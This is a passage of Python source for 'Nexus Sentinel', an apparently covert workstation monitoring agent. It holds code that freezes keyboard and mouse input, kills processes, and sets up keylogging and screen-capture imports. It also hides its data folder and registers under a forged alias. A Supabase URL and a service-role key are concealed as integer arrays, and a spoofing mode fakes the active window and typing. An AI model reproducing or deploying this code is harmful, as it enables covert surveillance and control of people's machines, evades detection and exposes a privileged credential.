"""
NEXUS SENTINEL — Phase 6.4 (Merged Sovereign Build)
=======================================================
Fuses the Forensic Agent and the Physical Warden into a single unit.
"""

from __future__ import annotations

import io
import json
import os
import platform
import random
import re
import socket
import sqlite3
import subprocess
import sys
import threading
import time
import uuid
from collections import deque
from datetime import datetime, timezone, timedelta
from pathlib import Path
import queue
import unicodedata
import difflib
from difflib import SequenceMatcher

import psutil

try:
    from supabase import create_client, Client
    from pynput import keyboard, mouse
    import cv2
    from PIL import ImageGrab
except ImportError:
    sys.exit("Install dependencies: pip install supabase psutil pillow pynput opencv-python")


class SentinelStrike:
    """The enforcement layer: Hardware Suppression and Surgical Termination."""
    def __init__(self, timeout_sec: int = 300):
        self.system_frozen = False
        self.timeout = timeout_sec
        self._lock = threading.Lock()


        self._k_listener = None
        self._m_listener = None

    def scalpel(self, target_name: str) -> bool:
        """Surgically terminate a specific process."""
        if not target_name: return False
        target_name = target_name.lower().strip()
        try:
            killed = False
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] and proc.info['name'].lower().strip() == target_name:
                    proc.terminate()
                    print(f"[strike] Scalpel strike successful: {target_name}")
                    killed = True
            return killed
        except Exception as e:
            print(f"[strike] Scalpel failure: {e}", file=sys.stderr)
        return False

    def _suppressor_logic(self):
        """Discards all I/O interrupts at the driver level with explicit unhooking."""
        def dummy_callback(*args, **kwargs):
            pass


        self._k_listener = keyboard.Listener(on_press=dummy_callback, on_release=dummy_callback, suppress=True)
        self._m_listener = mouse.Listener(on_click=dummy_callback, on_scroll=dummy_callback, on_move=dummy_callback, suppress=True)


        self._k_listener.start()
        self._m_listener.start()

        start_time = time.time()
        while self.system_frozen:
            if time.time() - start_time > self.timeout:
                print("[strike] Failsafe timeout reached. Forcing OS unhook.")
                self.system_frozen = False
            time.sleep(0.1)


        if self._k_listener:
            self._k_listener.stop()
            self._k_listener = None
        if self._m_listener:
            self._m_listener.stop()
            self._m_listener = None

    def engage_freeze(self, duration: int = None):
        """Locks hardware inputs."""
        with self._lock:
            if not self.system_frozen:
                self.system_frozen = True
                threading.Thread(target=self._suppressor_logic, daemon=True).start()
                print("[strike] Hardware Suppression Engaged.")
                if duration:
                    threading.Timer(duration, self.disengage_freeze).start()

    def disengage_freeze(self):
        """Restores user control."""
        with self._lock:
            if self.system_frozen:
                self.system_frozen = False
                print("[strike] Hardware Suppression Disengaged.")


WARDEN = SentinelStrike()

_u_codes = [104, 116, 116, 112, 115, 58, 47, 47, 111, 122, 114, 117, 105, 107, 102, 110, 114, 109, 109, 118, 104, 118, 111, 122, 103, 110, 111, 111, 46, 115, 117, 112, 97, 98, 97, 115, 101, 46, 99, 111]
_k_codes =  [101, 121, 74, 104, 98, 71, 99, 105, 79, 105, 74, 73, 85, 122, 73, 49, 78, 105, 73, 115, 73, 110, 82, 53, 99, 67, 73, 54, 73, 107, 112, 88, 86, 67, 74, 57, 46, 101, 121, 74, 112, 99, 51, 77, 105, 79, 105, 74, 122, 100, 88, 66, 104, 89, 109, 70, 122, 90, 83, 73, 115, 73, 110, 74, 108, 90, 105, 73, 54, 73, 109, 57, 54, 99, 110, 86, 112, 97, 50, 90, 117, 99, 109, 49, 116, 100, 109, 104, 50, 98, 51, 112, 110, 98, 109, 57, 118, 73, 105, 119, 105, 99, 109, 57, 115, 90, 83, 73, 54, 73, 110, 78, 108, 99, 110, 90, 112, 89, 50, 86, 102, 99, 109, 57, 115, 90, 83, 73, 115, 73, 109, 108, 104, 100, 67, 73, 54, 77, 84, 99, 51, 79, 68, 81, 53, 78, 68, 99, 48, 77, 105, 119, 105, 90, 88, 104, 119, 73, 106, 111, 121, 77, 68, 107, 48, 77, 68, 99, 119, 78, 122, 81, 121, 102, 81, 46, 75, 68, 95, 106, 109, 118, 115, 75, 57, 114, 87, 117, 55, 98, 114, 112, 77, 73, 107, 112, 102, 54, 118, 102, 76, 112, 103, 107, 67, 66, 120, 115, 71, 70, 69, 114, 100, 120, 106, 67, 104, 95, 73]

SUPABASE_URL = "".join(chr(c) for c in _u_codes)
SUPABASE_KEY = "".join(chr(c) for c in _k_codes)

# =============================================================================
# ABSOLUTE PORTABILITY OVERRIDE (USB DEPLOYMENT)
# =============================================================================
# Force all data to stay on the execution drive (the Pendrive). Zero C:\ footprint.
BASE_DIR = Path(__file__).parent.absolute()
DATA_DIR = BASE_DIR / ".nexus_data"

try:
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    if platform.system() == "Windows":
        subprocess.call(["attrib", "+H", "+S", str(DATA_DIR)], shell=False)
except Exception:
    pass

ALIAS_FILE = DATA_DIR / ".sentinel_alias"
VAULT_DB = DATA_DIR / ".sentinel_vault.db"
CACHE_DIR = DATA_DIR / ".sentinel_cache"
IDENTITY_FILE = DATA_DIR / ".sentinel_id"

def get_workstation_identity() -> str:
    """Resolve workstation display name.

    Precedence:
      1. Contents of ~/.sentinel_alias (stripped) if present and non-empty.
      2. Fallback: socket.gethostname().
    Runs BEFORE the Supabase client is initialized so registration uses the
    forged identity from the very first network call.
    """
    try:
        if ALIAS_FILE.exists():
            alias = ALIAS_FILE.read_text(encoding="utf-8").strip()
            if alias:
                return alias
    except Exception as e:
        print(f"[identity] alias read failed: {e}", file=sys.stderr)
    return socket.gethostname()


WORKSTATION_NAME = get_workstation_identity()


def set_high_priority() -> None:
    """Elevate this process so it out-competes browsers/games for CPU.

    Windows -> HIGH_PRIORITY_CLASS.
    Unix    -> nice(-10) (requires privileges; silently ignored otherwise).
    """
    try:
        p = psutil.Process(os.getpid())
        if platform.system().lower().startswith("win"):
            p.nice(psutil.HIGH_PRIORITY_CLASS)
        else:
            p.nice(-10)
    except (psutil.AccessDenied, PermissionError):

        pass
    except Exception as e:
        print(f"[priority] elevation failed: {e}", file=sys.stderr)


set_high_priority()

HEARTBEAT_INTERVAL = 15
SCAN_INTERVAL = 3
ACTION_POLL = 4
KEYLOG_DURATION = 10
ALERT_DEBOUNCE_SEC = 30
AMBIENT_DEBOUNCE_SEC = 60
FOCUS_REFRESH_SEC = 10
EVIDENCE_BUCKET = "evidence"
SYNC_INTERVAL = 30


OPTICS_LOCK = threading.Lock()
VAULT_LOCK = threading.Lock()


GHOST_ACTIVE = False
SPOOF_DATA = {
    "proc": "msedge.exe",
    "title": "Microsoft Learn: Python for Data Science - Edge",
}
BYPASS_KEY = "099hsj"


PHANTOM_SCRIPT = [
    "def calculate_loss(y_true, y_pred):\n    return sum((t - p) ** 2 for t, p in zip(y_true, y_pred)) / len(y_true)\n",
    "import numpy as np\nmatrix = np.zeros((10, 10))\nfor i in range(10):\n    matrix[i][i] = 1\n",
    "async def fetch_data(url):\n    async with aiohttp.ClientSession() as session:\n        async with session.get(url) as response:\n            return await response.json()\n",
    "class DataProcessor:\n    def __init__(self, data):\n        self.data = data\n    def clean(self):\n        return [d.strip() for d in self.data if d]\n",
    "SELECT users.id, profiles.avatar_url FROM users JOIN profiles ON users.id = profiles.user_id WHERE users.active = true;\n",
]

COMMAND_TTL_SEC = 60
TERMINATE_GRACE_SEC = 5


import math
import unicodedata
from functools import lru_cache
from typing import Optional, Tuple, Dict, Set, List
import base64, json, zlib

# =============================================================================
# 1. THE ARSENAL (Base64 Offline Matrix)
# =============================================================================
_B64_LEX = b'eJx9XNuSpTpy/ZWKebJnPI7T3cd2e17mQ6YdDgECVFxEI9iXMv53r5UpCbG7jiOqyMwlLkKXvEns//lTvbrN1Wb809/e/vGnHz+qf1r8Oh88+G41S/8seFeroMdwLKvHqTx9/Q2H38j9+PHneH2/V0r12Ah5BCWPR6RK9IpttSpve2Uzswo3ZGwwTugSqwOqNw1us5mJ0GbWzCh09+uodfmQo1PB1ZueaOPbr24RptPX7Uy8+e+DkO961mwT/fHjX2s/SZt4Oeb3b74Pkbm5xnqtxuhHfRttYD21Hk0I8bUGN/t/Rof86V/epF/YZPKHxuIBLJvvIW35mKPMKjzmf/z1v9/+6+/E5YmRhEi/ClXpePRmChsamYwcRnezGb4IvZ6+6PmTvzk0c6Tfj0dr5s2EJ54P4I4CE090QdC94emPB2/Do4w0cNU+Dzzv8UhIsPKiUr9HrCxQjA9U5GTJcViUzVSt5uPDoq8rM3fV6iOzK9WGEXg2e9dvTzPZFeM/iXpCAvGQ0W1PdEUXkqBnKDT5FndqXOc2My6jeXar3+cmIXpqgdubG1ELOwoXnyXy+z7a8O7XxszKa2FE8LQhjq+NTTBYuwmnZ6lcmcqGeNbd1YNtjptjE/Z72EZOI1Sk8hhvdt56vwd7TBbTYiOJdYHw+MdfI3f3d+E7t46BkjLzXrnRtm6cEq8Xl0g4zMYmalCXsLgP74/UMXJLGVYJwXjY9gBNc3MPzL5qNFL5SFdzPxprF7yAnEW5N2vziC+J6b/tK5/Y7OO2uckqp5USOdR+tfpcg14Q8eTYN8vxDcM4HP1PDkE8qv8ZO0/F1izS+WSanUdtQDC12QRFZYSufpFyzH4Q/C1yVdC7cGSDPEYev3zHqwvlcfZ3ucF2E2LcqBc6ueBRDvLVNqIOn6g5pwyF73LUWn9Ho5t54IhX7u5Wq5yeoPI+qzoHc76tqrtvv/0m9+vMiCYS9lGPbgnCNvuiWKm0KPu2HR10op0WMI+jWVWDN2vsDpF6v2lr+9hLImEQf0SdQjaXEJh3Gchf5W176cqvchQAc683WvfejqNy9gEdgZHNdor8WYej3dXSYKYe6BN5v8fR6ysCkMc1H747Or/lNh7chjFQ79PooczWozPPs+GO0NvJpNmg16xmnp/yQGWLGnQFICdX1V0KQMvTqL3Yj4n5OPzamTCRPHlg+4Q7JhsqFGlAHevBw86hrgHNTBp1BaVqHwYz2IMq+eZgG4XTE1QOozUfz9lSn5eGTkw0boGZgyGQO1DEcoT6eXzCHoSDTNQPSWyP31KpMAdZDPZ36KnWr1JAPl7m1+L6ycxPsQdkUoWbOPlh2ody8ossXfp7QMcc7g4LpV0srJ4Vh/X6DBu0J4bvcITBLVuPwT+xbSHEDuljG8UCa6njosqNUlKkK/X6BE2L2dWZFcpZ+ol8NEIF0pimeZaFCiwGze1nGehzaKke5hq3XD25WHuVR/80o7SQcEWLmWZyHPyRidMKjSGlruybVgV0/XCkDiwgHmyjQO5fgi9Q7T3sJ5plgRV5RlH5wU5wj3KRisoHNy21i0x8N4owVRuV6ZYHW5JoNzgUK6NnhdSwz1jVqrrUuarKEVr3BnajolsX2SNDEbNnsfAOnbnBLySgXKxnlGGQeb5ycSBArjy8x5qei3DxmiT7Qsbhdx4UEjb4xpyQSNOzXa2VC6Y0twAU95na+qCJfYeecLOw0Z9Q4N2ug1SVTBwRSUTrOfUBXXyoCFDn6/Y7n6NsrOL5eJ147ers3LRupnospqLiyVHQ0rY9HqO/8U3odcij/O18DzS8XdekM29RBAP9jOLVNHDuwecLlFF85TSQxljPCZEa+QYVybGVrykAOjlnQZLoN4Hce1rDXKri3Va8MRSjcrGrsnzeUfXvXfoVHRmG57K6m4yZIZmCCFAhS8OfmjmLMt5OXIeftMmlOSIWLu6xtd3BQ9Ra8CDe3ccHaRwhlPKh8kLi/IGnsMBXh/IZrPo3gz2nJKXNPFwBZ9F01IRngcrLXo1wswu+LK0/+KI3pbEgSjUiC+jasugCIfIIuAl8Vt/AUCQaz3nAVa6HFWopArXf6/6Y7SbhUfRyk08s2DkYApyJZfSIMJvaj6Pt7Au6WQsdKGDjxbALH/W6v3gHO9QWlD8drHVPTcOZuMOEm6p6wpxvNvLJc1Pky3fqW332l++nBi5ryqq0juOIehRCmn8JcvMT4SxJnM4IVO2Gt4BHqoziX76XY6hH7yAGVxL739zguStS8l+hCZvIt/4ROXrdl8sZwqosnJnptac+F2GOD42vkCSl6CtMh1Qtt/kpERp0E3kwGIDDLkcU7GJpxme8ToXL7eP7WNS24TyZIwmJ9u7Ywg6N6g8o1ngVuE/uMqFfL+9cALfUXBKYlicVgBjD2JKrn+jowrROrpaxJFwxtugupOfA5qgqLtiyLFWQ/IYQwe+wS4eta7ze6Ec0DYyrqYFRSnQzxeO+IRz71pS+cDuVkt/XWkLGyTDUR8Rbeb/ux4pQ99vvQvR0CvhfTI9o+9CTAupkhh2vuIxQqlGM0z6CiJL15CY5Rio+DW0NkzMMeExrBdYzxKXaKlcd89OY08vS9hiv3ZXFYJWLHfvkcAVcThC5y4xnMhxv8Q8pe8qow4tj++q2ooU3KsAv33/8+AtzHFdYzgznjIcrzAD4ehJU/27GNJ6pnDiAjsRcTxYHPyqOmOezq98yMZHGN9j8Ss8VQyAVZ6uTyqB/t/WYXZvyJfF+CFyb9HRppQ6Bxd0hUCGTNBxEFv7+5YtkPiSL1NptdK0lTdYQkhm3aMjAkVAnmxWRbm0jHysmyGCCa5zVMIk3CNtzjOJ5VwXPGaSVPro7nOLJgrAo7NXFsNLch2/4x1j7M4ge7ePJAx+ZmkgzchpiFkwoTDcCErHd0a5frbxYOdIrnOKGVHxxtSCf3BnCUCpp+MV9KBwPSInmSPJOKdE0AiQzRzxzyRlY5OpETzQkuKjA5qXlThIuT15OSaYPpERPVN/35DAj8sQ4xI7C8q9M40gCGG3nqUmXfVQ2weVLj0bbIDNxfJfKTzJKNo08DAwBXkQyWw/HOSA8Ui75+BNrhIolpsAnmE5hmALTtFa6K6fKM4uXsTnuGCM4BDnCjkTHlUemYfwgWRkSisAYT2lQJUeGZYORyNgwZd3vTOluq5mWgylE2wiBIp2W3kcSIoVlcaZmThze1rYzj55YtrJlFm6LJEQqrhz6KfrO41i44/TeFrp3ZGKzU6xX47owupQ5QBcEP5uRqdt5QywuNAXAKlUcWCcsIhsidZf0Z7un51Q743LKkbtX53llky/SQDxSHXJVhHK906/FgQmaeQaAAkA307nZgLyb5zvDV1M5w8zFJgfo1CCMRtPwVeVIrTKbDeJ2hxLgASGlxbhEZxqXIietyj3pTRU31/UXINBta0qk5vS93CP83BH5RSJ6RjjRzmfmC1FnnWZQt8NHSrpVb9JKhupX5OU0mKmhlK3ZXsSXC9igbgS4X/Sy5GV5YJ4eHBocQO3jAe36G9iB8mDuw3GXnGndjwjNMU559TD7Cu4wF4bs7FceLQ/oFDmyg7+JxN4k7TFg90hh9dC27SYzFk1Ckow3EwBoPTli5K+21hkRGUzXzbXtU+IX9Bn11r1nVhwdvHfZ5KOOlesKacK1W2pkLa/qo7rX8s5RR+ypCUoGdz5PgeZE9y1HN/r12XsYReGid0sZvk/zjtYhjfEjpNb7LdETxYSP5IJtT06nExapGv2d5aTFfeHzclwVaQvftgfG25BoRi9Br/cVky1eMm6kz6P67Tdi9o4jns3/oNWRI0+Ea/FnzijMg7BFksSirlAXEpG971wRsiP7rWYeDOOmFo26Gr7SDr/i7Cd53tmJIjJszakaQXB6PlGYmb5eSmcIUkTbFBH3ds+y2K1TIUInDmXx7JaFzo4QEZOdQ78jMPXwe5XE1ol+Blc5IJOWLY0XkHFh0HT4Uz6EYsRUsD+ZKXAz71TE9bZzxQhKo6ZewbV1b+0gvVY2HwookLRJM1B43139PEXMwKJwg2db10rkOBQ34/2T74PQysBwyAGuAslpZyklWgwDipmJimmELud78vTzfZO0jHtXwFnUGZBxEYNv/PRU4j7ssbppogYG5cxYU66OAisgevAwmyxIj1x3Ojr6XTjwstZptoSUS23rnpcr5cUR31ZJnytgLv3cmtoZrmGRhEitLDe04nqn5Yar5OcCDXc0Ll1HpWLx8ypFLOPyRWThIXmzLc5GLjYaZK4OKiZsHN0KdJgOvHN5jeobAbRtR78sse+r94vYM31RAhvGPcHCiYbfHPIShzRLfg0X33fy+waj7aZLApr2lfWvz3RxFsE0mQtwVoOd9AhHQYwE9JBt+GrCJK8GuiYqzMZ3FEgqzOBKdJBJDqOIM8YY7wCa6iuYdmSGCh7hU9GdzQ73D1KiSXXsst6UaGy41VV0/QAUbPQYNGqBbFP8MraFlaIojNm3GKdmU1CMtHXT8bduZTNPbmwPHoIcY7/u9P4FiCwigc4kwvwdrurkql8W6hTQxMZml4mLP1sad0ma/NYz6igKMhCchLRnGYCrlIob2ZVwOfcCNRyeRZFK8HrL20WpWn2BJgn0paIJgQpGKByJ3znL0V4pwthWRAsJS1K8NL5Aef5moGAjorwci1Y9K5D2kRAp+dQ6FbXbxcn7w7S95kGZBJfBaC5D9P9N58sdynx+AUy+sddCRcrMmgBnjl5lvujnsqkRLYdQILJ1SXM95GS5abEnE8oVKI3BKZ9cNGbjXsVVqwuHztpXmPyfO31ZW96HojBr0isjowWKyrwG2RqyJeO23lx9WQvWTGLw7SaJXzLJM10vmzU01SvHYmAUMrPDIpKpMdG9L3YuJEST69eijHM/SVmQspYxWfuticxtLU66rZGc1bgh8NmTzbxsDdLHWI7dwf4hpLuhiJErDJeI+9xwOMRmcUlmyntvHCICJbk8ZSm1wVz5iCTFWyCOxByluyzM6UXLJre4+S2O+CgtF5RS7W4uZ0aZDbv6BrIBRv0MUNsoWcVtF0f96r5DyrFc8uMvwJ2ZBx54S1LZC9TxX4y7bRD940C+8xJSkYhNkcVnIWLpPGuXkp3kf412ihBJczyyfU2O/XPhdhmXDb4Cciw6QOS8AaQuB0G1GjffTejLYZvTC1n0Y5lP6v12Z7Yzr4CLxEOatWaVpmHyMvJpJ0hxm9lufuVi08zc7FYO8Hdz4/8V6ZsTU57b6DIUhdHhndbniScg7IOt7CUx/kfp/rweEHP7Kf9v//3rl0N3bpFr97wcHPMykIV7IkyWw1OO4vHNcYGi8oi4KWZGtiblcpHShiWb9h6IBEWXd3fI1kpMKd0KizFFXlQzmUJnJ7zcGyGVpJiZpFp1kn66tSLvNYjtyj0YGLLwfGhJYz1FsitTging1zwhDfHICa9suke4GM6OGhiH59HtcAh4KB0diGqb5x3tK8fYOm6cVBausuIoK7GJEec0cdR1NYKPjenUk21OXjIfD1vvVy5ENm9PYtZ82tcmvVOJKD+4ccwK5BNIEuxEomgmkUgRTOZAqK5xqSxbZ6xeMXVLoGWsWMpiIAsgMD2gimktFQFFYS5706Q/IkL+ksVFaEv3WylT2Qok1x9avfkMC1dw9pu9IgucjyvSYi5OUDdpI1ocFFw6+QU82/EpyXT4zQt03JjNVwOnvi9ceiioScTMpOjifafaAFCwsd2ZwIZUS0ixnbm/6SlP7M0L4G92xTRMzbqz4XxTSvaRMk6VYcSxLDsUD+pkBrc6YdILQnxHiHM1UvuU/WVH+wPVJUm7NI1Tdw1TOIanbJZPXo6hEEmstROBZOsRZi1eaLwTJERGc6IZveS4Ru+5Z1YyhUIqNrtwannIlZaI8mg1ArQPVB/tEmPL3k5+XXsm1TMrY7hM5+oTw7Kv2wsGM8MVyUQTIFpZoYtnJkjJn9PybnIaU7S3OgDcjJUkO1q4zj5qDTctZtRtd8oyiN5r17qHrO0oT49kNE9xUEAhBrgW4i8Ik7rQ6Dblff0EObf6CXRusZIpTPF1/jYuTHaS3bCJo/pLPJ+eBXkDxP676sXSiLipOufEKUlQ0HCvGoZPygGYbWOcfwXhnm9uOswjaQnRnMdk6t4mLRsvhBmrqvTuWQvofGZRbgTFyiRL4OJFCbC6s62H0dTS0Js6aKSfPwGNgbbwd8RJJ2tlE32o7RoNRhJsc93mFDanO7YrpmszL+zx4f3SuxGz7SPHoFkmZ4sCtjrhFItcc4GUT+4lbDHjL1dJxglOxHkPCEE21a6hWM0T8QWXTL79iWlaTqA658Ki1Goef3HFQyDo1vO13JdBUZgh70/IYmY2teM56a3ag3JqmvMxEF7WHst3x/Sz4/a8tIepuI++RJL2KLFovq8tSVOrPn7ynzOUGzgjqHDeeOsU2cdf7rTuyTNv7eZg6gUp+atTsW1pU5UUHsueM4UKMLuUZ4m6UZcxVCDCX3eouksYILJy5epk2vZTQkFcmgYGu+xVATJbetI7NweYzn4CnULssMtZ78aNsjGWzNm+skOo1FoQM1NfFFraXPQKvcrRQDSwWXlhKwMFK+ctqz33u5VI4uNQu55zFZX78u1z+PfP4X/jTsrU3xLKi3xyxeNETt1RXAEp0WvvnaOgmDtRidMoSu65tzaBi/v4MHmwpFMuPmV/Brv8ek7kkysHuwDKrp7jPkZGKpBDZMRpoiSW0hDq5vFsILNIJp5GxSyGk0xhRxMeT2s8c8TFjIqJl7IgQQh6njOXeeJjKZw+eAe/3TLsAdLKB0tnmcpw9T+ecHc25ZI3D3kwspdJSfrgiuvwi/ULLBS8ZBFjJwh4OtD3pblsg6IMLUu/avMP3DcKSRkSKtdn0vsplhuAJtPgrvWmfBwhBSLfSRRlInfyARS7rWgbkRG3NDIS+uw3isjz+NGBJFmyrybARXn5lYtOSpiCbWRfQqRSkbQtnx7rRXRWy6WEOf8lJCqbyxQpB+cFWqAuPDsw5w3hImSTyUItE1Rl+LjdfjmjRPQZcF7W5DacfK18MVG1jNw1ShWvK4WpInT7HHJOJ2L0qy5Al1fcc0B6NpYkpa/iJb53XFnAgQt4Fp3qwmimcyMfY/E0rn4a2xhIiaYBbypjKsiJq/wQ35Yh0iSychiOrjKz0iQxkvr5U6j9qLgjD0PLZc5MJqWo0GimMzMefjfdnJMZS7jI+rXeMAwHPEm4Vuszb/jUxQcOV4UvwOanu2lbOwsbp54CGvTgDT1X71zYMhLb4MTTTvDZfDhKQrnpcWpXz22XZKMWEUA+40vNjTJ6/0ZWTFTg6sqY9PMsmw+9gqd4h9KxnZ29xJMixbZI2Jf4Hcbdr5jT3DJ2GifFVpPSkHd+HAGJFCMKWlhdaYQeLzJeh2G0dV3yceA4faDB0J3JXrN74qeSVxDqYOW+pS1zU+QuEUYJ1dzSXALL6OFYOOg1PfJuymAevZser47aTPx8CMF+WmNerrmMykvMFbEo1dkZ9CmAqnbuO0UBIRW29dz49XKeyx8VXUXNLfySJJly3p83+rVc0PMZOF08VACRXdxiX2uiz2IJMZXMbFZ4CCGvsPihwv+JJ+S6fIbxMh5KuMcE/pQeo/DLDBW0kIPDbPHwNd5R13dOljp/1yT37vacylFg9HHef9jNhEOPddOxO6PvF8x4M+yD3hxTgCM2heyTYRJMaeLnjdQ9v2rVEmAilSr4ep6WpPO4FRqzIjYbww0dJVuanWdmUtFXuXBaFCjY0oooEi3K2bZytsi/XHcmUxXN8osjp2nGxOhuoqTEYyGh88wa3GuWUsHr3VL7nRopwicgH9zUbNXIwLNIyikyTOdv/ZyMTz0yoyUZHEFP+Z7mphhpipkp8JALoqVPi2Udcx35S0FWUXZNjvtU5biZ29i4ipbhldtXVzPLNi93c4MEe27HvXsqsbrf1+TQcVeb7D5FuIZB/9KAEc3yfjPjmVbVKwPmTN5F54dr4WwCXLVxtC+NfkklYQCMyQWM5PQJURLMLcdpUdN2CL5l5zDdO5wSd/qnselHOPE2oVm+ZKdf0SzvIybPVXq5oj33m16zPFKA0E1TPjxOsqW1cFQVKPL1nttoJWMvHN3EoqScbSwSUMUzCNHnUT65+DRNhxFQ9tLwJq1c8psjSolG42orkYTmJV1I6U3WweouJWBRgncWr149N3BAzMyJK/f1U/Rbvuhr5r7pV/H8GFaYqEsoBrNcqkMgsZWp93AtFSgK/bNJXVsikbfTcn5hXEJRmNnXk3k5JaNR5n4vfjuQNiz/AkdAPh32ybt6AaMIT8p30AD+clJGowxf7Ct7bEsG4uvZm3CE/Jy+Cxfh5ABD9wmbhnYuuIfM1ua8jX7F5Zomu2ducBEQNserv5zUyLd0csz2bJ8UiAs25cL5BTqF18IXjp6iawq2OF/3vtb9ma7NQGY/OT0K8QNJtIGbkwDuEfiRFKIUMI4/9DAyx6tE27de5XdALgI4Zg8++LME5yrri6ivRvnk0jQIeuKFqWta2OalBSN0CnlRPY6eiEUJDrOsMGRnh8qkjmpWN8rVQlq84sdR327ZgCyUEr0+4nZLymKjQo03r6MIpoXJ7TMsUi6OZqAWRRgimMXIXOe8YlGq/Ja/hs0+lPyggpYAEwn2MzDKSvM7RXZxSxDKDb2S8f6qASKWX5H7VHSnkzDXu1TiekRyLWqa5FReXL1SgecpjuDwzocAKFgMMjh25Nb6QAnij2J6pxMFSoL7ukCh3Bz3pcXXkk+LZlE0ET+Rr0vD7rEUIs3e9butt6Obd5Z9WMSPkZ4WZ/SDS/RE7z1q9Dj40WL6LjColKiislL1c6/seZZIoAzenpPfz5KMgB98Y7iHa4GTlD9khP+7UpspCFF/sSf2Pdwllcldlmb2vIecG+Z5vBpHAAUbrbmdG78KENna1yb7c9dRWfvhU7xHU7rXmEFKuFD+R7iZlh7ByfQHD2u5XWx+jp+VjSFpSlMFSkKnZjKfnW3rwK2OnxU9EL49kupag8rC+Qf8m8Z/XjcUfgZ3+6eNwGzUZzh90e5cdIFOX6HOI5rlrvc5c7vPKpLZJa6ypjp/JkquKAsSlL8gXjlfmvNu35oIUeizj6GhngCZPcPCpBUUSxKT68n/uQaEWpICwmLzHkKahV+oEboIcbY3n44LlIshjUNSdhm31uX9obN9lrACpcKuHIJ1N0csSdUWbcnkHlSDW61MnYf2KcdT9Mo4EhHvjCeYRD793IvwyIjyiAnKNR+Kunzo1/ry4aMCmgX1Mxdlck4oCiDBzoFfYnIyd5fLI6JrPmN2n085rkXxJrXLyip/e/dfUDE9vMnztwyDW6AbNSIJ+9ryU6wGelu+/PrMFkQDMPu1uS1cKfKbn8nBY6E1IusXKxBsVto2e6u5nXJv2hF27I0Fx+3ryo/DoRkXv72F3tmxOe5ubgLCVf4g1D7PDOa5txc14749RJ3Pyq4yd44J/sENDp+7mfp53J7Lymf2fkyh1cJV2C3aFebCJvmw8vGUNH1NTsRjUMIjg16JRtTgAK2ei+QJ4sykl31dvn02NgzyY3P8VT+Ohj1sgoVlRKzKLyJG302wcYeZpqcYBFqD21z/U7yEkw+B1N/1s0MUMKxGLPoGo8/tSDF+tPejuaeJ+uF7/8YPopiH3BeeeTHkJgwMAflaNTrmLX4Xx5WAFZqMO1a3U+ukLt5DdQX4S2ja9vNkFm7tWMIuC2A/RwKTm9xgto9jhcMxcPXHPvG6/LGt1smCI7dXcKfdW2xmdB5VUYcuWc3hGsOCo5nD8jwe//57U3WHR4xOCteZi/eojp07GJjrb7x1ePX1+WYbfgF6QCZ3xPah1zyF+ugWQcH6GbE0TgsTf5UTWkVobB1xuNeyffZ59NpizY2bVJu38AybnWruEHUeCgL3ukFBMZ0iq2VH5i9LDHgx+C1vNu67aezNjpgi69vGTNJRb+v448dfMAFaOP9/cUf75esbZzC/+tIfhnhrbLVLk3IM6M/kSEGe1ZhR3C2SJ3bgeESXVKN/HDTNiAvajfpnm9l5N/5sHdM5neWvdMz8eZnuqLrJidP1xqF+QI093vgLLpiTDAK63b75NiNROf+V2zAHTKjQIfwIXw+7uPpNP5fnT0WNXJzkFFzZnNub3ugwbqL3yPnU6x4cdPWbdjMco90GZmUQ8PjHG78TY8qhiQxvPnrMq8lOO7rWvZllSWcxdwQ/puGrwT+L36w30mqT548vUjExFLp+bMRKYOxyUzed7Y8DgTnXfyYurmx/E5+X/bcn5ieGQOK/fPv2H494BXMIrdt06ck37q8rrCJfJcCCrvLZwOhlGyiqZR8wFyvaflsq7lay8Y7hePKf+sh1nf7MJJv08jMaCC24C3dhek8TOMK+KU/Vyv22jQswnfypjH4f92O7O6aLnn6X38+j9uVTAn+AU3T00cYfFfzP/L3Bnfu8a0yLukfbytd/TpZwYSdHx39cb5avDb/N9n6QG6A5BpN/0ykPVTe3Po/TzQ2bHw6ZNt0q+0trKwn5AF9DfrthkdiAX9qIMV6P/+xMF1eI5WXkN1TTAjgT6yvsCK4MGBQHM9FyY36FZuU3APkDjFQOmAWOax13+b2osmGZTqDaMHD/MU1wbeP2Ke105rh848JPK1/nUcxStX98tJY7fKFMmkVy/xjZIeTlfpH4C1MVf6y0R2fBoMHa8VebpIGPzn1McFnR77OMdPbQ0TF+RlSqzfi//wenRau5'
LEXICON = json.loads(zlib.decompress(base64.b64decode(_B64_LEX)).decode('utf-8'))

SEVERITY_RANK = {"info": 1, "warning": 2, "high": 3, "critical": 4}

_COMPILED = {
    sev: [re.compile(pat, re.IGNORECASE) for pat in patterns] 
    for sev, patterns in LEXICON.items()
}

_LEXICON_META = {"com", "exe", "svc", "net", "org", "www", "http", "https", "the", "and", "for", "you", "are", "not"}
_TOKEN_EXTRACT = re.compile(r"[a-z0-9]{4,}")

def _flatten_vocab(lexicon: dict) -> dict:
    out = {}
    for sev, patterns in lexicon.items():
        bucket = set()
        for raw in patterns:
            for tok in _TOKEN_EXTRACT.findall(raw.lower()):
                if tok not in _LEXICON_META: bucket.add(tok)
        out[sev] = sorted(bucket)
    return out

_VOCAB = _flatten_vocab(LEXICON)

# =============================================================================
# 2. QWERTY SPATIAL MATRIX (The Physical Typo Engine)
# =============================================================================
_KEY_COORDS = {
    'q':(0,0), 'w':(1,0), 'e':(2,0), 'r':(3,0), 't':(4,0), 'y':(5,0), 'u':(6,0), 'i':(7,0), 'o':(8,0), 'p':(9,0),
    'a':(0.5,1), 's':(1.5,1), 'd':(2.5,1), 'f':(3.5,1), 'g':(4.5,1), 'h':(5.5,1), 'j':(6.5,1), 'k':(7.5,1), 'l':(8.5,1),
    'z':(1,2), 'x':(2,2), 'c':(3,2), 'v':(4,2), 'b':(5,2), 'n':(6,2), 'm':(7,2)
}

@lru_cache(maxsize=4096)
def _qwerty_distance(c1: str, c2: str) -> float:
    if c1 == c2: return 0.0
    if c1 not in _KEY_COORDS or c2 not in _KEY_COORDS: return 2.0 # Max penalty for symbols/numbers
    x1, y1 = _KEY_COORDS[c1]
    x2, y2 = _KEY_COORDS[c2]
    return math.sqrt((x1 - x2)**2 + (y1 - y2)**2)

# =============================================================================
# 3. HOMOGLYPH & DEMOLITION NORMALIZER
# =============================================================================
_ZERO_WIDTH = dict.fromkeys(map(ord, ["\u200b", "\u200c", "\u200d", "\u200e", "\u200f", "\u202a", "\u202b", "\u202c", "\u202d", "\u202e", "\u2060", "\u2061", "\u2062", "\u2063", "\u2064", "\ufeff", "\u00ad", "\u180e", "\u034f"]), "")
